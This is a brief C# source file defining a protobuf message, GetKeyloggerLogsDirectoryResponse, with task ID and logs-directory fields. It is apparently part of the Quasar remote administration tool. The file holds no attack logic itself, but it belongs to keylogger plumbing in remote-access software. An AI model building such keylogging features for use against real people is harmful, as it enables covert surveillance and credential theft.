using ProtoBuf;

namespace Quasar.Common.Messages
{
    [ProtoContract]
    public class GetKeyloggerLogsDirectoryResponse : IMessage
    {
        [ProtoMember(1)]
        public string TaskId { get; set; }

        [ProtoMember(2)]
        public string LogsDirectory { get; set; }
    }
}
